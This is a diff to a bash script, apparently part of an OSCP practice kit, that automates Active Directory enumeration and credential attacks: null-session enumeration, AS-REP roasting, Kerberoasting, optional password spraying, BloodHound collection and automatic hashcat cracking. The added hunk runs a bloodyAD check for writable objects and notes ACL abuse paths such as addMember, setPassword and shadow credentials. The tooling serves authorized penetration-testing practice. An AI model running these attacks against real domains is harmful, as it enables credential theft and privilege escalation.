@@ -2,8 +2,9 @@
 # --- self-locate kit root (survives moving the whole tree) ---
 KIT="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")/.." && pwd)"
 # ad-fastpath.sh — OSCP Active Directory fast-path enumeration & roasting.
-# Runs null-session enum, AS-REP roast, Kerberoast, optional spray + BloodHound,
-# and auto-launches hashcat on anything roastable. Outputs to the box workspace.
+# Runs null-session enum, AS-REP roast, Kerberoast, a bloodyAD writable-object
+# (ACL) check, optional spray + BloodHound, and auto-launches hashcat on anything
+# roastable. Outputs to the box workspace.
 #
 # Usage:
 #   ad-fastpath.sh -d <domain> -i <DC-IP> [-u user] [-p pass | -H nthash]
@@ -92,6 +93,17 @@ if [ "$AUTH_OK" = 1 ]; then
   netexec smb "$DCIP" "${NXA[@]}" --users 2>&1 | tee "$OUT/nxc_users.txt"
   netexec smb "$DCIP" "${NXA[@]}" --groups 2>&1 | tee "$OUT/nxc_groups.txt"
   netexec smb "$DCIP" "${NXA[@]}" --pass-pol 2>&1 | tee "$OUT/nxc_passpol.txt"
+
+  log "Writable AD objects (bloodyAD get writable)"
+  if command -v bloodyAD >/dev/null 2>&1; then
+    if [ -n "$HASH" ]; then BPASS=":$HASH"; else BPASS="$PASS"; fi
+    bloodyAD --host "$DCIP" -d "$DOMAIN" -u "$USER" -p "$BPASS" get writable --detail 2>&1 \
+      | tee "$OUT/bloodyad_writable.txt"
+    [ -s "$OUT/bloodyad_writable.txt" ] && \
+      save "$OUT/bloodyad_writable.txt (objects these creds can modify — ACL abuse: addMember / setPassword / targeted Kerberoast / shadow-creds)"
+  else
+    echo "[!] bloodyAD not installed — skipping writable-object check (pipx install bloodyAD)."
+  fi
 
   if [ "$BH" = 1 ]; then
     log "BloodHound collection (bloodhound-python)"
